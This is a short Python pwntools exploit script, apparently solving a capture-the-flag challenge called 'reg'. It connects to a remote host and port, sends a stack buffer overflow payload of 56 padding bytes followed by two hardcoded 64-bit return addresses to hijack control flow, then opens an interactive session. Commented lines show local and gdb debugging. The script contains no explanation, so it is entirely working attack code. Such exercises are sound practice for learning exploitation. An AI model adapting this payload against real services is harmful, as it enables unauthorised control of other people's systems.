#!/usr/bin/python3
import pwn
#e = pwn.context.binary = pwn.ELF("./reg")

# p = e.process()
p = pwn.connect("94.237.54.48","48126")

#p = e.debug(gdbscript="source /home/nick/global/halfdisp.py\nbreak *main\nc")
payload=b"A"*56
payload+=pwn.p64(0x4012ac)
payload+=pwn.p64(0x401206)
#payload+=b"A"*1024
p.sendline(payload)
p.interactive()
